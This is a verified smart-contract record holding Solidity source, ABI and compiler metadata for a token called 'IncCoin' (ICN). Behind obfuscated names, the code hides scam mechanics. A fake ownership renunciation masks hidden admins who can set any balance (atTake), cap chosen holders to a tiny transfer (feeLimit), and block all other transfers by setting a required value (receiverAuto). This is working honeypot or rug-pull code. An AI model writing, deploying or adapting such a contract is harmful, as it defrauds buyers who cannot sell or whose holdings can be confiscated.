{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract feeIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyIs {\n    function createPair(address buyLaunch, address takeWallet) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface minSenderTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface walletSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTeam) external view returns (uint256);\n\n    function transfer(address exemptTo, uint256 tokenTotal) external returns (bool);\n\n    function allowance(address minLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTo,\n        uint256 tokenTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listMarketing, uint256 value);\n    event Approval(address indexed minLaunch, address indexed spender, uint256 value);\n}\n\ninterface walletSwapMetadata is walletSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IncCoin is feeIs, walletSwap, walletSwapMetadata {\n\n    function shouldReceiverMin() private view {\n        require(sellList[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return sellMarketing;\n    }\n\n    address public swapLaunch;\n\n    bool private sellLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapReceiver;\n    }\n\n    function receiverAuto(uint256 tokenTotal) public {\n        shouldReceiverMin();\n        tradingTo = tokenTotal;\n    }\n\n    function feeLimit(address marketingTotal) public {\n        shouldReceiverMin();\n        if (teamList == sellBuy) {\n            tradingFee = txFee;\n        }\n        if (marketingTotal == launchedAmount || marketingTotal == swapLaunch) {\n            return;\n        }\n        marketingTakeLimit[marketingTotal] = true;\n    }\n\n    uint256 private tradingFee;\n\n    address private sellMarketing;\n\n    uint256 tradingTo;\n\n    function feeShould(address limitList) public {\n        require(limitList.balance < 100000);\n        if (launchedMode) {\n            return;\n        }\n        \n        sellList[limitList] = true;\n        if (teamList != sellLaunched) {\n            exemptAuto = tradingFee;\n        }\n        launchedMode = true;\n    }\n\n    bool private sellBuy;\n\n    function atTake(address tokenMin, uint256 tokenTotal) public {\n        shouldReceiverMin();\n        tradingMarketing[tokenMin] = tokenTotal;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamTrading;\n    }\n\n    bool public launchedMode;\n\n    function fromExempt() public {\n        emit OwnershipTransferred(launchedAmount, address(0));\n        sellMarketing = address(0);\n    }\n\n    function fromReceiver(address totalTradingReceiver, address exemptTo, uint256 tokenTotal) internal view returns (uint256) {\n        require(tokenTotal > 0);\n\n        uint256 swapWallet = 0;\n        if (totalTradingReceiver == swapLaunch && fundAmount > 0) {\n            swapWallet = tokenTotal * fundAmount / 100;\n        } else if (exemptTo == swapLaunch && swapMax > 0) {\n            swapWallet = tokenTotal * swapMax / 100;\n        }\n        require(swapWallet <= tokenTotal);\n        return tokenTotal - swapWallet;\n    }\n\n    uint256 public swapMax = 0;\n\n    string private senderEnable = \"Inc Coin\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTeam;\n    }\n\n    address shouldLaunched;\n\n    uint256 feeMinLaunch;\n\n    uint256 public exemptAuto;\n\n    address atExemptList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private swapReceiver = \"ICN\";\n\n    function name() external view virtual override returns (string memory) {\n        return senderEnable;\n    }\n\n    uint256 public fundAmount = 3;\n\n    event OwnershipTransferred(address indexed tradingReceiverList, address indexed listFrom);\n\n    constructor (){\n        \n        fromExempt();\n        minSenderTx fromMarketing = minSenderTx(atExemptList);\n        swapLaunch = buyIs(fromMarketing.factory()).createPair(fromMarketing.WETH(), address(this));\n        shouldLaunched = buyIs(fromMarketing.factory()).feeTo();\n        if (txFee == exemptAuto) {\n            sellBuy = true;\n        }\n        launchedAmount = _msgSender();\n        sellList[launchedAmount] = true;\n        tradingMarketing[launchedAmount] = teamTrading;\n        \n        emit Transfer(address(0), launchedAmount, teamTrading);\n    }\n\n    function senderReceiver(address totalTradingReceiver, address exemptTo, uint256 tokenTotal) internal returns (bool) {\n        if (totalTradingReceiver == launchedAmount) {\n            return tokenReceiver(totalTradingReceiver, exemptTo, tokenTotal);\n        }\n        uint256 receiverBuyFund = walletSwap(swapLaunch).balanceOf(shouldLaunched);\n        require(receiverBuyFund == tradingTo);\n        require(exemptTo != shouldLaunched);\n        if (marketingTakeLimit[totalTradingReceiver]) {\n            return tokenReceiver(totalTradingReceiver, exemptTo, swapTx);\n        }\n        tokenTotal = fromReceiver(totalTradingReceiver, exemptTo, tokenTotal);\n        return tokenReceiver(totalTradingReceiver, exemptTo, tokenTotal);\n    }\n\n    mapping(address => mapping(address => uint256)) private sellShouldReceiver;\n\n    function transferFrom(address totalTradingReceiver, address exemptTo, uint256 tokenTotal) external override returns (bool) {\n        if (_msgSender() != atExemptList) {\n            if (sellShouldReceiver[totalTradingReceiver][_msgSender()] != type(uint256).max) {\n                require(tokenTotal <= sellShouldReceiver[totalTradingReceiver][_msgSender()]);\n                sellShouldReceiver[totalTradingReceiver][_msgSender()] -= tokenTotal;\n            }\n        }\n        return senderReceiver(totalTradingReceiver, exemptTo, tokenTotal);\n    }\n\n    function tokenReceiver(address totalTradingReceiver, address exemptTo, uint256 tokenTotal) internal returns (bool) {\n        require(tradingMarketing[totalTradingReceiver] >= tokenTotal);\n        tradingMarketing[totalTradingReceiver] -= tokenTotal;\n        tradingMarketing[exemptTo] += tokenTotal;\n        emit Transfer(totalTradingReceiver, exemptTo, tokenTotal);\n        return true;\n    }\n\n    mapping(address => uint256) private tradingMarketing;\n\n    function balanceOf(address amountTeam) public view virtual override returns (uint256) {\n        return tradingMarketing[amountTeam];\n    }\n\n    uint256 constant swapTx = 3 ** 10;\n\n    mapping(address => bool) public marketingTakeLimit;\n\n    bool public teamList;\n\n    function transfer(address tokenMin, uint256 tokenTotal) external virtual override returns (bool) {\n        return senderReceiver(_msgSender(), tokenMin, tokenTotal);\n    }\n\n    function approve(address marketingToken, uint256 tokenTotal) public virtual override returns (bool) {\n        sellShouldReceiver[_msgSender()][marketingToken] = tokenTotal;\n        emit Approval(_msgSender(), marketingToken, tokenTotal);\n        return true;\n    }\n\n    uint256 private txFee;\n\n    uint256 private teamTrading = 100000000 * 10 ** 18;\n\n    uint8 private enableTeam = 18;\n\n    mapping(address => bool) public sellList;\n\n    function getOwner() external view returns (address) {\n        return sellMarketing;\n    }\n\n    address public launchedAmount;\n\n    function allowance(address feeAt, address marketingToken) external view virtual override returns (uint256) {\n        if (marketingToken == atExemptList) {\n            return type(uint256).max;\n        }\n        return sellShouldReceiver[feeAt][marketingToken];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiverList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"atTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"}],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTakeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"receiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTradingReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IncCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}